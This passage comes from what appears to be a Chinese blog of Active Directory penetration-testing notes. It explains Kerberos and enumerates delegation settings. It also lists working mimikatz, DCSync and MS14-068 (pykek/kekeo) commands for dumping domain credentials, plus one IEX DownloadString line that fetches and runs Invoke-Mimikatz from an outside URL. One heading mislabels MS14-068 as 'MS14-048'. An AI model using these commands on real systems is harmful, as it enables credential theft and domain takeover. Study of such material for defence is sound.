参数,则文件将被复制到本地服务器(脚本正在从运行的服务器)中指定的文件路径。    如果指定了 RemoteDestination 参数,则该文件将被复制到远程服务器中指定的文件路径。    Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;RDLABDC02&quot; -LocalDestination &quot;c:\temp\ntds.dit&quot;    使用 DIT 快照查看器(https://github.com/yosqueoy/ditsnap) ,可以验证我们是否顺利拿到了Ntds.dit 文件。8-0x04 在 DC 中使用 Mimikatz 转储 Active Directory 凭据    一般情况下服务帐户就是域管理员组或同等权限的成员或者攻击者从域管理员最近登录到的计算机中 dump 出登录凭证。    使用这些凭据,攻击者可以访问域控制器,并可以得到所有的域凭据,其中包括用于创建 Kerberos 的黄金票证的 KRBTGT 帐户的 NTLM 哈希值。    1. mimikatz.exe从域控上面抓取到所有账户信息:    mimikatz lsadump::lsa /inject exit    保存到mimikatz.log:    # log    # privilege::debug    # lsadump::lsa /inject    在域控制器上运行时,Active Directory域中转储凭证数据。需要管理员访问调试或本地SYSTEM权限    注意:RID 502的帐户是KRBTGT帐户,RID 500的帐户是该域的默认管理员。2. Invoke-Mimikatz本地转储Active Directory凭据    使用 mimikatz 从 LSASS 进程转储凭证 : Invoke-Mimikatz -DumpCreds    使用 mimikatz 导出所有私有证书即使它们已被标记为不可导出 : Invoke-Mimikatz –DumpCerts    在远程计算机上使用 debug 提升权限:Invoke-Mimikatz -Command &quot;privilege::debug exit&quot; -ComputerName &quot;computer1&quot;    or Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump::LSA /inject&quot; exit&#39;3. 使用 Invoke-Mimikatz 远程转储 Active Directory 凭据 (通过 PowerShell 远程管理)      外网下载并完全是在内存中执行代码    IEX(New-Object Net.WebClient).DownloadString(&#39;http://is.gd/oeoFuI&#39;); Invoke-Mimikatz -Command &#39;&quot;privilege::debug&quot; &quot;LSADump:LSA /inject&quot;&#39; -Computer dc2010.demo.local8-0x05 使用 Mimikatz 的 DCSync 功能远程转储 Active Directory 凭据    理解：向 DC 发起同步一个对象（获取帐户的密码数据）的质询。需要域管理员，域管理员组或者自定义委派的一个成员权限。    2015新的特性—— “DCSync”,可以有效地“假冒”一个域控制器,并可以向目标域控制器请求帐户密码数据。    之前利用 DCSync 的攻击方法是在域控制器上运行 Mimikatz 或 Invoke-Mimikatz 得到 KRBTGT 账户的密码哈希创建黄金票证。    如果使用适当的权限执行 Mimikatz 的 DCSync 功能,攻击者就可以通过网络远程读取域控制器的密码哈希,以及以前的密码的哈希,    且无需交互式登录或复制 Active Directory 的数据库文件NTDS.DIT。    运行 DCSync 所要求的特殊权限有管理员组Administrators,域管理员组 Domain Admins或企业管理员组Enterprise Admins    以及域控制器计算机帐户的任何成员都能够运行 DCSync 去读取密码数据。    需要注意的是只读域控制器默认是不允许读取用户密码数据的。    DCSync 是何如工作的:        a. 使用指定的域名称发现域控制器。        b. 请求域控制器通过 DSGetNCChanges 复制用户凭据利用目录复制服务DRS远程协议        DCSync 选项:        /user - 要拉取数据的用户的 id 或 SID        /domain可选的 Active Directory 域的 FQDN 域名,Mimikatz 会发现域中的一个 DC 并去连接。如果不提供该参数,Mimikatz 会默认设置为当前域。        /dc可选的指定你想要使用 DCSync 连接并收集数据的域控制器。        另外还有一个/guid参数。        DCSync 命令行示例:        拉取 demo.local域中的 krbtgt / testwin7 / administrator 用户帐户的密码数据:        Mimikatz &quot;privilege::debug&quot; &quot;lsadump::dcsync /domain:demo.local /user:testwin7&quot; exit</code></pre><h2 id="MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控"><a href="#MS14-048-限制条件-打了补丁或者域中有Win2012-2012R2-域控" class="headerlink" title="MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)"></a>MS14-048 (限制条件:打了补丁或者域中有Win2012/2012R2 域控)</h2><p>允许域内任何一个普通用户，将自己提升至域管权限。</p><p>作为普通用户向域控请求一个没有PAC的Kerberos TGT认证的票据，域控会返回一个TGT(不包含PAC，PAC通常包含有用户组中的成员关系)</p><p>生成一个伪造的PAC，因为没有密钥，所以生成的PAC”被标记”有MD5算法，而不是带有域用户密码数据的HMAC_MD5类型。</p><p>把伪造的PAC结合上TGT构造认证数据，作为TGS服务的一部分发送到域控。</p><p>域控会混淆构造的数据，所以直接丢弃之前用户发送没带有PAC的TGT，然后新构造一个TGT并用自己的认证数据插入到伪造的PAC当中，再把新TGT发送给用户</p><p>这样带有伪造PAC的TGT就能使用户成为有漏洞域控上的域管理员。</p><pre><code>1. mimikatz从域控上面抓取到所有账户信息    mimikatz # log    Using &#39;mimikatz.log&#39; for logfile : OK    mimikatz # privilege::debug    Privilege &#39;20&#39; OK    mimikatz # lsadump::lsa /inject    ......2. https://github.com/bidord/pykek    C:\pykek-master&gt;python ms14-068.py -u testwin7@demo.local -s S-1-5-21-1239069908-882060383-2558203358-1130 -d owa2010dc.demo.local  -p 1qaz$RFV --rc4 6df9f68e4b0656fa9ffd91d250506f8f    [+] Creating ccache file &#39;TGT_testwin7@demo.local.ccache&#39;... Done!]3. mimikatz # kerberos::ptc TGT_testwin7@demo.local.ccache (利用mimikatz注入高权限TGT的缓存证书)</code></pre><p>列举缓存证书的命令klist</p><p>或者使用 kekeo<br>kerberos::purge or klist purge(为了让我们自己生成的票据生效，需要我们先用mimikatz将内存中的票据清空)</p><pre><code>kekeo.exe # exploit::ms14068 /domain:demo.local /user:testwin7 /password:1qaz$RFV /sid:S-1-5-21-1239069908-882060383-2558203358 /rid:1130 /kdc:owa2010dc.demo.local /ptt (接着使用域、普通域用户名和密码生成票据)http://www.mottoin.com/95877.html</code></pre><p><strong>参考</strong></p><pre><code>Attack Methods for Gaining Domain Admin Rights in Active Directory    http://adsecurity.org/?p=2362 (国内关于域的文章基本来自于这里 還有 http://www.harmj0y.net)一种深度隐蔽的后门方式(二)    https://www.anquanke.com/post/id/93542Mimikatz小实验:黄金票据+dcsync    http://www.freebuf.com/sectool/112594.html域渗透之hash与票据    http://mp.weixin.qq.com/s/ENStRpYspx5W974BKPzZtA域渗透——利用SYSVOL还原组策略中保存的密码    https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%88%A9%E7%94%A8SYSVOL%E8%BF%98%E5%8E%9F%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E4%BF%9D%E5%AD%98%E7%9A%84%E5%AF%86%E7%A0%81/如何巧妙的从ntds.dit中提取Hash和域信息    http://www.freebuf.com/articles/system/151463.html从活动目录中获取域管理员权限的6种方法    http://www.4hou.com/technology/4256.htmlKerberoasting - Part 3    https://room362.com/post/2016/kerberoast-pt3/kekeo ticket 注入    https://www.anquanke.com/post/id/92484kerberoasting-without-mimikatz    https://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/    https://zhuanlan.zhihu.com/p/25723674 (翻譯)Hash传递攻击登陆Windows2012远程桌面    http://www.freebuf.com/articles/system/15757.htmlMimikatz 非官方指南和命令参考_Part1    http://www.anquan.us/static/drops/tools-12462.htmlMimikatz 非官方指南和命令参考_Part2    http://www.anquan.us/static/drops/pentesting-12521.htmlMimikatz 非官方指南和命令参考_Part3    http://www.anquan.us/static/drops/tools-12754.html</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> hash注入 </tag>
            
            <tag> Golden Ticket </tag>
            
            <tag> NTDS.dit </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Kerberos认证相关</title>
      <link href="/2018/02/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/"/>
      <url>/2018/02/18/Kerberos%E8%AE%A4%E8%AF%81%E7%9B%B8%E5%85%B3/</url>
      <content type="html"><![CDATA[<h2 id="0x01-Kerberos认证过程-简易版"><a href="#0x01-Kerberos认证过程-简易版" class="headerlink" title="0x01 Kerberos认证过程 (简易版)"></a>0x01 Kerberos认证过程 (简易版)</h2><p>认证或请求服务 的过程如下:<br><img src="/2018/02/18/Kerberos认证相关/simple.jpg" alt="认证或请求服务"></p><p><code>简义</code></p><pre><code>`KRB_AS_REQ (Kerberos Authentication Service Request)`1. Client-A ---------------------------------------------------------==&gt; KDC-AS (客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)) 此过程叫KRB_AS_REQ`KRB_AS_REP (Kerberos Authentication Service Response)`2. Client-A &lt;==--------------------------------------------------------- KDC-AS (返回TGT,TGT票据使用KDC的krbtgt密钥进行加密) 此过程叫KRB_AS_REP`KRB_TGS_REQ (Kerberos Ticket Granting Service Request)`3. Client-A ----------------------------------------------------------==&gt; KDC-TGS (Client-A使用AS返回的&quot;会话密钥&quot;构建访问特定服务的请求,再把AS返回的&quot;TGT&quot;连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REP`KRB_TGS_REP (Kerberos Ticket Granting Service Response)`4. Client-A &lt;==---------------------------------------------------------- KDC-TGS (TGS解密TGT和服务请求,并向Client-A发送一个服务票据ST(Service Ticket)`KRB_AP_REQ (Kerberos Application Request)`5. Client-A ----------------------------------------------------------==&gt; Server-B (Client-A把服务票据中的服务器部分和请求一起发送到Server-B(Client-A要访问活动目录中的主机),远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的)</code></pre><a id="more"></a><h2 id="0x02-Kerberos认证过程-详细版"><a href="#0x02-Kerberos认证过程-详细版" class="headerlink" title="0x02 Kerberos认证过程 (详细版)"></a>0x02 Kerberos认证过程 (详细版)</h2><p><img src="/2018/02/18/Kerberos认证相关/Kerberos.jpg" alt="详细版"></p><p>认证或请求服务 的过程如下: </p><h3 id="1-Client-A-—-gt-KDC-AS"><a href="#1-Client-A-—-gt-KDC-AS" class="headerlink" title="1. Client-A —&gt; KDC-AS"></a>1. Client-A —&gt; KDC-AS</h3><pre><code>KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)    a. 客户端Client对用户口令执行散列运算转换为NTLM散列。此散列值(即用户密钥)成为客户端和KDC共享的长期密钥(long term key)。     b. KRB_AS_REQ (Kerberos Authentication Service Request) - 客户端执行散列运算加密一个时间戳,然后发送给身份验证服务(KDC-AS)。</code></pre><h3 id="2-Client-A-lt-—-KDC-AS"><a href="#2-Client-A-lt-—-KDC-AS" class="headerlink" title="2. Client-A &lt;— KDC-AS"></a>2. Client-A &lt;— KDC-AS</h3><pre><code>KRB_AS_REP (Kerberos Authentication Service Response) - 身份验证服务(KDC-AS)会解密时间戳,若解密成功(KDC-AS检查用户的信息(登录限制.组成员身份等)并创建票据授予票据(Ticket-Granting Ticket,TGT),并向本地LSA (Local Security Authority)请求生成一个特殊的数据PAC,表明了客户端获得某个特定用户的口令(即验证了用户的身份)。身份验证服务(KDC-AS)向客户端回复两条信息:     a. 短期会话密钥SessionKeya-kdc,用于客户端向KDC发起后续的请求 ,该消息经客户端的长期密钥(long term key)加密。(此短期会话密钥仅适用于该客户端和KDC之间)    b. 票据授予票据(Ticket Granting Ticket,简称TGT),包含有关用户名.域名.时间和组成员资格等信息。TGT票据使用KDC的krbtgt密钥进行加密,PAC使用krbtgt密钥进行进行签名,并且系统很少会验证PAC数据(在Windows环境中为krbtgt账户的NT-Hash)。</code></pre><h3 id="3-Client-A-—-gt-KDC-TGS"><a href="#3-Client-A-—-gt-KDC-TGS" class="headerlink" title="3. Client-A —&gt; KDC-TGS"></a>3. Client-A —&gt; KDC-TGS</h3><pre><code>KRB_TGS_REQ (Kerberos Ticket Granting Service Request) -Client使用AS返回的”短期会话密钥”构建访问特定服务的请求,再把AS返回的”票据授予票据(TGT)”连同请求一起发送到票据授予服务TGS) 此过程叫KRB_TGS_REQClient-A使用AS返回的会话密钥SessionKeya-kdc构建访问特定服务的请求。客户端Client再把请求连同TGT一起发送到票据授予服务TGS。(TGT是被KDC的krbtgt密钥加密的，所以Client-A无法解密)黄金票据 - 此过程3可以伪造TGT(前提是获取krbtgt账号的口令散列值)，宣称自己是域内任何账号，包括域管或者不存在的用户，这是黄金票据的原理。</code></pre><h3 id="4-Client-A-lt-—-KDC-TGS"><a href="#4-Client-A-lt-—-KDC-TGS" class="headerlink" title="4. Client-A &lt;— KDC-TGS"></a>4. Client-A &lt;— KDC-TGS</h3><pre><code>KRB_TGS_REP (Kerberos Ticket Granting Service Response) -票据授予服务TGS解密TGT和服务请求,然后如果请求被允许(KDC会打开票据,进行校验和检查。如果DC能够打开票据,并能通过校验和检查,那么会认为TGT为有效票据。此时TGT中的数据会被复制,以创建TGS票据ST),票据授予服务TGS向客户端Client发送一个服务票据(Service Ticket,简称ST),包括两个部分:     a. 远程服务器的部分 - 包含请求用户的组成员资格、时间戳、用于客户端和远程服务器之间通信的会话密钥。使用远程服务器Server-B和KDC共享的长期密钥(long term key)加密这部分消息。    b. 客户端的部分 - 包含用于客户端和远程服务器之间通信的会话密钥SessionKeya-b。(使用步骤2中AS回复的短期会话密钥(SessionKeya-kdc)加密这部分消息生成的会话密钥SessionKeya-b。)</code></pre><h3 id="5-Client-A-—-gt-Server-B"><a href="#5-Client-A-—-gt-Server-B" class="headerlink" title="5. Client-A —&gt; Server-B"></a>5. Client-A —&gt; Server-B</h3><pre><code>KRB_AP_REQ (Kerberos Application Request) - Client-A把服务票据(Service Ticket)中的服务器部分和请求一起发送到Server-B(用户要访问活动目录中的主机)。远程服务器将直接接受该服务器票据,并不需要和KDC直接通信,因为该票据是用远程服务器和KDC共享的长期密钥加密过的。解密成功(目标服务会使用自己的NTLM密码散列打开TGS票据,并提取用户的授权数据和会话密钥SessionKeya-b。)即表明KDC已经允许了此次通信。白银票据 - 此过程5可以伪造TGS(前提是获取服务账号的口令散列值)，宣称自己是域内任何账号，例如域管，这是白银票据的原理。</code></pre><h2 id="0x03-术语"><a href="#0x03-术语" class="headerlink" title="0x03 术语"></a>0x03 术语</h2><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>是Windows活动目录中使用的客户/服务器认证协议(windows中的认证协议有两种NTLM和Kerberos),为通信双方提供双向身份认证。</p><p>相互认证或请求服务的实体被称为委托人(principal)。参与的中央服务器被称为密钥分发中心(简称KDC)。</p><p>KDC(密钥分发中心　Key Distribution Center)有两个服务组成 : </p><pre><code>1. AS 身份验证服务(Authentication Server)2. TGS 票据授予服务(Ticket Granting Server)该认证过程的实现不依赖于主机操作系统的认证,无需基于主机地址的信任,不要求网络上所有主机的物理安全,并假定网络上传送的数据包可以被任意地读取.修改和插入数据。在以上情况下, Kerberos 作为一种可信任的第三方认证服务,是通过传统的密码技术(如:共享密钥)执行认证服务的。</code></pre><h3 id="krbtgt账户"><a href="#krbtgt账户" class="headerlink" title="krbtgt账户"></a>krbtgt账户</h3><p>每个域控制器DC都有一个”krbtgt”的用户账户,是KDC的服务账户,用来创建票据授予服务(TGS)加密的密钥。</p><h3 id="Principal-委托人"><a href="#Principal-委托人" class="headerlink" title="Principal　委托人"></a>Principal　委托人</h3><p>一个具有唯一标识的实体,可以是一台计算机或一项服务,通过使用KDC颁发的票据来进行通信。委托人可以分为两类: 用户和服务,分别具有不同种类的标识符。Kerberos信任模型的核心是每个委托人(principal)和KDC的通信是在利用仅双方可知的密钥构建的安全通道中进行。</p><p>当委托人(principal)之间需要通信的时候,它们再使用KDC生成的会话密钥。</p><pre><code>1. 用户 (UPN)    用户通过如&quot;user@REALM&quot;格式的用户主体名称(User Principal Name,简称UPN)来标识。记住REALM一定是大写的。2. 服务 (SPN)    服务主体名称(Service Principal Name,简称SPN)是Kerberos身份验证服务(AS)所必需。    用于域中的服务和计算机账户。SPN的格式形如&quot;serviceclass/host_port/serviceName&quot;。    例如, 主机&quot;dc1.bhusa.com&quot;上LDAP服务的SPN可能类似于&quot;ldap/dc1.bhusa.com&quot;, &quot;ldap/dc1&quot;和&quot;ldap/dc1.bhusa.com/bhusa.com&quot;。    参考全限定主机名和仅主机名,一个服务可能注册为多个SPN。(同通常是执行DNS查询来规范化主机名称。这就解释了DNS为什么是微软Kerberos环境中的一个必要组件。查询服务的&quot;规范化&quot;名称,然后生成请求服务的SPN。)</code></pre><p><code>枚举域帐户的SPN</code></p><pre><code>GetUserSPNS.ps1 - https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1Find-PSServiceAccounts.ps1 - https://github.com/PyroTek3/PowerShell-AD-Recon/blob/master/Find-PSServiceAccountsPowerView 的 Get-NetUser -SPN - https://github.com/PowerShellMafia/PowerSploit/blob/5690b09027b53a5932e42399f6943e03fa32e549/Recon/PowerView.ps1#L2087-L2089</code></pre><p><img src="/2018/02/18/Kerberos认证相关/getspn.png" alt="getspn"></p><h3 id="PAC-Privilege-Access-Certificate-特权访问证书"><a href="#PAC-Privilege-Access-Certificate-特权访问证书" class="headerlink" title="PAC (Privilege Access Certificate 特权访问证书)"></a>PAC (Privilege Access Certificate 特权访问证书)</h3><p>KDC在向Kerberos客户端颁发TGT时,会向本地LSA (Local Security Authority)请求生成一个特殊的数据结构,名为”特权访问证书”这个PAC包含为Kerberos客户端构建一个本地访问令牌所需的用户信息,他同时使用域控制器服务器的私钥和KDC服务器的私钥来进行数字签署,以防假的KDC伪造PAC。</p><p><code>PAC数据结构</code></p><pre><code>1. 用户的登入时间以及用户会话额到期时间2. 用户上一次设置密码的时间,以及允许他再次更改密码的时间3. 用户的经典登入名,domain\user4. 用户的显示名称5. 指派给用户账户的经典NT登入脚本的名称(如果有的话)6. 用户漫游配置文件的UNC路径7. 客户端主目录的UNC路径8. 用户的并发登入数9. 在颁发PAC的KDC处,自从上一次成功登入以来,所允许的不成功登入尝试次10. 用户的RID11. 用户的&quot;主要组&quot;的RID,只限在POSIX使用12. 在域中,将用户作为一个成员的组的数量,以及每个组的RID13. 适用于用户的已知SID14. 域的SID15. 资源域的SID</code></pre><p>除此之外,PAC中还嵌入了另一个名为<code>用户账户控制</code>的数据结构<br>如何得到</p><p>powerview </p><pre><code>Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| flGet-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</code></pre><p>dsquery</p><pre><code>dsquery * -limit 0 -filter &quot;(&amp;(objectCategory=computer)(objectClass=computer))&quot; -attr cn operatingSystem distinguishedName useraccountcontrol msds-allowedtodelegatetodsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontroldsquery * -limit 0 -filter &quot;(&amp;(objectCategory=user)(objectClass=user))&quot; -attr cn distinguishedName useraccountcontrol msds-allowedtodelegateto</code></pre><h3 id="LSA-Local-Security-Authority"><a href="#LSA-Local-Security-Authority" class="headerlink" title="LSA (Local Security Authority)"></a>LSA (Local Security Authority)</h3><p>LSA管理本地安全策略、管理审计策略和设置、为用户生成包含SID和组权限关系的令牌。LSA验证的过程: LSA通过访问本地SAM(Security Accounts Manager)数据库,可以完成本地用户的验证。</p><p><code>LSA的处理流程</code>: </p><pre><code>1. LSA首先会把身份凭据交给SSPI,由该接口负责与Kerberos和NTLM服务沟通。2. SSPI不能确定用户是本地登录还是域账户进行域登录。所以他会先把身份认证请求传递到Kerberos SSP。3. Kerberos SSP会验证用户的登入目标是本地计算机还是域。如果是登录域,Kerberos SSP将继续处理。如果是本地计算机,即用户不是登录域,Kerberos SSP返回一个错误消息到SSPI,交回给GINA处理,使服务器登录不可用。4. SSPI现在发送请求到下一个安全提供程序——NTLM。NTLM SSP会将请求交给Netlogon服务针对LSAM (Local Security Account Manager,本地安全账户管理器)数据库进行身份认证。使用NTLM SSP的身份认证过程与Windows NT系统的身份认证方法是相同的。</code></pre><h2 id="0x05-相关"><a href="#0x05-相关" class="headerlink" title="0x05 相关"></a>0x05 相关</h2><p><strong>krbtgt 密码</strong></p><p>它是整个活动目录中唯一的不会自动更新的密码。<br>除非:</p><pre><code>第一种情况: 域功能级别(domain functional level,简称DFL)从NT5(2000/2003)升级到NT6(2008/2012)。第二种情况: 利用域的恢复数据来实施域的裸机恢复(bare metal recovery)。</code></pre><p><strong>Kerberos智能卡进行身份认证</strong></p><p>Kerberos也允许使用PKI和智能卡进行身份认证。用户会被提示输入一个智能卡的PIN码,而不是口令。</p><p>Windows使用PIN码来访问智能卡上的公钥证书(public key certification)。利用智能卡的私钥签名该证书,并发送到KDC。</p><p>KDC验证证书上的签名是否源于可信实体。然后KDC发送公钥证书加密过的TGT。既然信息只能被智能卡的私钥解密,用户也就通过了域的身份认证。</p><p>然而,对于使用智能卡进行身份认证的账户来说,密码的散列值仍然存储在域控服务器上。此外,智能卡只能对”交互式会话(interactive sessions)”提供保护。</p><p>也就意味着智能卡认证仅能用于登录域中的计算机。</p><h2 id="0x06-Reference"><a href="#0x06-Reference" class="headerlink" title="0x06 Reference"></a>0x06 Reference</h2><pre><code>深入解读MS14-068漏洞:微软精心策划的后门?    http://www.freebuf.com/vuls/56081.html敞开的地狱之门:Kerberos协议的滥用    http://www.freebuf.com/articles/system/45631.html你所不知道的Kerberos 整理笔记(三)    http://www.voidcn.com/article/p-nnpovuml-ng.html</code></pre>]]></content>
      
      <categories>
          
          <category> 技术相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
            <tag> KDC </tag>
            
            <tag> Kerberos </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>利用域委派获取域某些权限</title>
      <link href="/2018/01/25/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%9F%90%E4%BA%9B%E6%9D%83%E9%99%90/"/>
      <url>/2018/01/25/%E5%88%A9%E7%94%A8%E5%9F%9F%E5%A7%94%E6%B4%BE%E8%8E%B7%E5%8F%96%E5%9F%9F%E6%9F%90%E4%BA%9B%E6%9D%83%E9%99%90/</url>
      <content type="html"><![CDATA[<h2 id="0x01-域委派"><a href="#0x01-域委派" class="headerlink" title="0x01 域委派"></a>0x01 域委派</h2><p>将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p><p>域内委派主要有3种应用方式：</p><pre><code>一. 非约束性委派Unconstrained Delegation     服务账号可以获取某用户的TGT，从而服务账号可使用该TGT，模拟用户访问任意服务。    举例说明，如果某个服务A的服务账号B被设置为非约束委派，当用户C通过Kerberos认证访问服务A时，KDC会检查服务账号B的属性，发现是非约束性委派时，KDC会将用户C的TGT放在TGS中，这样B在验证TGS的同时获取了A用户的TGT，从而可以模拟用户A访问任意服务。    从网络攻击的角度看，如果攻击者控制了服务账号B，并诱骗管理员来访问服务A，则可以获取管理员的TGT，进而模拟管理员访问任意服务，即获得管理员权限。越是大型网络、应用越多的网络，服务账号越多，委派的应用越多，越容易获取域管理员权限。二. 约束性委派Constrained Delegation    即Kerberos的扩展协议S4U2Proxy，服务账号只能获取某用户的TGS，从而只能模拟用户访问特定的服务；三. 协议传递    即Kerberos的扩展协议S4U2Self，服务账号针对某一个特定服务，可查询获取任意用户的TGS，从而能模拟任意用户访问该特定服务。</code></pre><a id="more"></a><p>在Windows系统中，普通用户的属性中没有委派Delegation这个选项卡，只有服务账号、主机账号才有</p><pre><code>WIN10-NEW$ ： 192.168.19.8        加入域 DEMO.LOCALowa2010dc$   ： 192.168.19.10    域服务器：DEMO.LOCALtestwin10 : 域用戶</code></pre><p>在域DEMO.LOCAL上设置WIN10-NEW$的delegation(在Service Manager -&gt; Roles -&gt; demo.local的computers里找到WIN10-NEW$右键设置)，</p><pre><code>--&gt; Trust the computer for delegation to specified service only    --&gt; Use any authentication protocol        --&gt; 点击add -&gt; 点击find now             --&gt; owa2010dc(域机器名) -&gt;ok-&gt;ok                --&gt; 选取cifs协议(共享)</code></pre><p><img src="/2018/01/25/利用域委派获取域某些权限/delegation.png" alt="delegation"></p><p>查询服务账户(或者机器账号)的域委派权限方法</p><pre><code>ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;*&quot;ldifde -f &quot;C:\windows\temp\\ld.temp&quot; -s owa2010dc -d &quot;dc=demo,dc=local&quot; -p subtree -r &quot;(&amp;(objectClass=User))&quot; -l &quot;cn,givenName,displayname,samAccountName,mail,department,title,description,scriptPath&quot;</code></pre><p>因为ldifde导出的WIN10-NEW机器账号： </p><pre><code>userAccountControl: 16781312WORKSTATION_TRUST_ACCOUNT : 4096TRUSTED_FOR_DELEGATION : 16777216==&gt; 16777216 + 4096 = 16781312</code></pre><p>根据<a href="https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx" target="_blank" rel="noopener">https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx</a>  符合规则。</p><pre><code>属性标志 十进制SCRIPT                                  = 1,        // 0x1ACCOUNTDISABLE                          = 2,        // 0x2HOMEDIR_REQUIRED                        = 8,        // 0x8LOCKOUT                                 = 16,       // 0x10PASSWD_NOTREQD                          = 32,       // 0x20PASSWD_CANT_CHANGE                      = 64,       // 0x40ENCRYPTED_TEXT_PASSWORD_ALLOWED         = 128,      // 0x80TEMP_DUPLICATE_ACCOUNT                  = 256,      // 0x100NORMAL_ACCOUNT                          = 512,      // 0x200INTERDOMAIN_TRUST_ACCOUNT               = 2048,     // 0x800WORKSTATION_TRUST_ACCOUNT               = 4096,     // 0x1000SERVER_TRUST_ACCOUNT                    = 8192,     // 0x2000DONT_EXPIRE_PASSWD                      = 65536,    // 0x10000MNS_LOGON_ACCOUNT                       = 131072,   // 0x20000SMARTCARD_REQUIRED                      = 262144,   // 0x40000TRUSTED_FOR_DELEGATION                  = 524288,   // 0x80000NOT_DELEGATED                           = 1048576,  // 0x100000USE_DES_KEY_ONLY                        = 2097152,  // 0x200000DONT_REQUIRE_PREAUTH                    = 4194304,  // 0x400000PASSWORD_EXPIRED                        = 8388608,  // 0x800000TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION  = 16777216 // 0x1000000</code></pre><p>或者通过<code>PowerView</code>的Get-DomainUser,查看userAccountControl是否包含 TRUSTED_FOR_DELEGATION</p><pre><code>PS C:\PowerSploit-dev\Recon&gt; Get-DomainUser testwin10 -Properties userAccountControl,msds-allowedtodelegateto | fluseraccountcontrol : NORMAL_ACCOUNT, TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION</code></pre><p>或者通过Windows自带AD管理模块</p><pre><code>import-module activedirectory get-adcomputer -Filter {(TrustedForDelegation -eq $True)} -Properties TrustedForDelegation,TrustedToAuthForDelegation,ServicePrincipalName,Description    </code></pre><p>或者<code>PowerView</code>的Get-DomainComputer(<a href="http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/" target="_blank" rel="noopener">http://www.harmj0y.net/blog/activedirectory/s4u2pwnage/</a>  ) ：<br>通过PowerShell脚本枚举域内所有的机器账号，查看哪些账号被设置了<code>委派</code>，以及是何种类型的委派设置(获取机器的某些信息 包括useraccountcontrol,msds-allowedtodelegatetol)：</p><pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-ComputerProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fldistinguishedname        : CN=OWA2010DC,OU=Domain Controllers,DC=demo,DC=localmsds-allowedtodelegateto :name                     : OWA2010DCuseraccountcontrol       : 532480distinguishedname        : CN=OWA2010,CN=Computers,DC=demo,DC=localmsds-allowedtodelegateto :name                     : OWA2010useraccountcontrol       : 4096distinguishedname        : CN=WIN10-NEW,CN=Computers,DC=demo,DC=localmsds-allowedtodelegateto : {cifs/OWA2010DC.demo.local/demo.local, cifs/OWA2010DC.demo.local, cifs/OWA2010DC, cifs/OWA20                           10DC.demo.local/DEMO...}name                     : WIN10-NEWuseraccountcontrol       : 16781312</code></pre><p><img src="/2018/01/25/利用域委派获取域某些权限/computerproperty.png" alt="computerproperty"></p><p>或者PowerView的Get-UserProperty(通过PowerShell脚本枚举域内所有的用戶账号)：</p><pre><code>PS C:\Users\Administrator\Desktop\PowerSploit\Recon&gt; Get-UserProperty -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| flname                     : Administratordistinguishedname        : CN=Administrator,CN=Users,DC=demo,DC=localuseraccountcontrol       : 66048msds-allowedtodelegateto :name                     : Guestdistinguishedname        : CN=Guest,CN=Users,DC=demo,DC=localuseraccountcontrol       : 66082msds-allowedtodelegateto :name                     : krbtgtdistinguishedname        : CN=krbtgt,CN=Users,DC=demo,DC=localuseraccountcontrol       : 514msds-allowedtodelegateto :name                     : testwin10distinguishedname        : CN=testwin10,CN=Users,DC=demo,DC=localuseraccountcontrol       : 524800msds-allowedtodelegateto :</code></pre><p>或者 (获取机器的所有SPN信息 包括useraccountcontrol,msds-allowedtodelegateto)</p><pre><code>C:\Users\Administrator&gt;dsquery * -l -limit 0 -filter &quot;&amp;(!objectClass=computer)(servicePrincipalName=*)&quot; -attr serviceprincipalname name samaccountname memberof pwdlastset distinguishedname useraccountcontrolserviceprincipalname: kadmin/changepwname: krbtgtsamaccountname: krbtgtmemberof: CN=Denied RODC Password Replication Group,CN=Users,DC=demo,DC=localpwdlastset: 131182114793700226distinguishedname: CN=krbtgt,CN=Users,DC=demo,DC=localuseraccountcontrol: 514serviceprincipalname: test/testname: testwin10samaccountname: testwin10memberof:pwdlastset: 131602140228263620distinguishedname: CN=testwin10,CN=Users,DC=demo,DC=localuseraccountcontrol: 524800</code></pre><p>或者 